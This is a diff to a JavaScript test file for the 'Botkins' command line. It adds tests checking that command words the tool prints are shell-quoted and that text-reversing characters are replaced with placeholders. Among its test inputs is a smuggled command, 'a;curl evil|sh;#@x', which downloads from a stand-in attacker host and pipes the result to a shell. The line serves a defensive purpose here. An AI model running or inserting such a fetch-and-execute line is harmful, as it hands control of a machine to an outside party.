@@ -10,6 +10,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { Readable, Writable } from "node:stream";
 import { main } from "../cli/main.mjs";
+import { shellWord } from "../cli/commands/tools.mjs";
 import { terminalPaths } from "../desktop/terminal/paths.mjs";
 import { startService } from "../desktop/terminal/serve.mjs";
 import { controlClient } from "../desktop/terminal/socket.mjs";
@@ -383,4 +384,41 @@ test("a folder that is a plugin is not taken as a folder of skills, and two skil
   assert.equal((await real("skills.get", "report")).name, "report");
   assert.equal((await real("skills.get", "REPORT")).name, "report", "one match, whatever its capitals");
   assert.deepEqual((await changes()).filter((line) => line.startsWith("skills.")), ["skills.save report"]);
+});
+
+/** The command line against a stand-in client that answers each call with a fixed value. */
+async function fake(answers, argv) {
+  let out = "";
+  let err = "";
+  const stdin = Readable.from([]);
+  stdin.isTTY = false;
+  const sink = (take) => new Writable({ write: (chunk, _encoding, done) => (take(String(chunk)), done()) });
+  const client = { call: async (name) => (name in answers ? answers[name] : Promise.reject(new Error("unexpected call " + name))) };
+  const exit = await main(argv, { stdout: sink((text) => void (out += text)), stderr: sink((text) => void (err += text)), stdin, env: {}, client });
+  return { exit, out, err };
+}
+
+test("a word of a command that Botkins prints for someone to run is quoted for a shell, and a word that cannot be written has no runnable form", { skip }, async () => {
+  const turn = String.fromCodePoint(0x202e);
+  // The rule itself: plain words stay, any other word is in single quotes, a quote is '\'' , nothing runnable for a word that turns text.
+  assert.equal(shellWord("memory@test-market"), "memory@test-market");
+  assert.equal(shellWord("--bot=Nova"), "--bot=Nova");
+  assert.equal(shellWord("a;curl evil|sh;#@x"), "'a;curl evil|sh;#@x'");
+  assert.equal(shellWord("a$(x)`y`"), "'a$(x)`y`'");
+  assert.equal(shellWord("it's"), "'it'\\''s'");
+  assert.equal(shellWord("a b"), "'a b'");
+  assert.equal(shellWord(""), "''");
+  assert.equal(shellWord("a" + turn + "b", "<its id>"), "<its id>");
+  assert.equal(shellWord("a\nb", "<its id>"), "<its id>");
+  assert.equal(shellWord("a\u200bb"), "<the word>");
+  // A name with a space, in the sentences that say what to run next.
+  const tool = await fake({ "tools.add": { name: "my tool" } }, ["tools", "add", "my tool", "--url", "https://example.test/mcp", "--yes"]);
+  assert.equal(tool.exit, 0, tool.err);
+  assert.ok(tool.out.includes("`botkins bots tools <bot> --off 'my tool'`") && tool.out.includes("`botkins tools test 'my tool'`"), tool.out);
+  const skill = await fake({ "skills.save": { name: "my skill" } }, ["skills", "add", "my-skill", "--description", "d", "--instructions", "i"]);
+  assert.ok(skill.out.includes("`botkins bots skills <bot> --off 'my skill'`"), skill.out);
+  // A name with a character that turns text: a placeholder, and the way to get the name.
+  const odd = await fake({ "tools.add": { name: "a" + turn + "b" } }, ["tools", "add", "x", "--url", "https://example.test/mcp", "--yes"]);
+  assert.equal(odd.out.includes(turn), false);
+  assert.ok(odd.out.includes("--off <the tool>`") && odd.out.includes("`botkins tools test <the tool>`") && odd.out.includes("`botkins tools list --json`"), odd.out);
 });
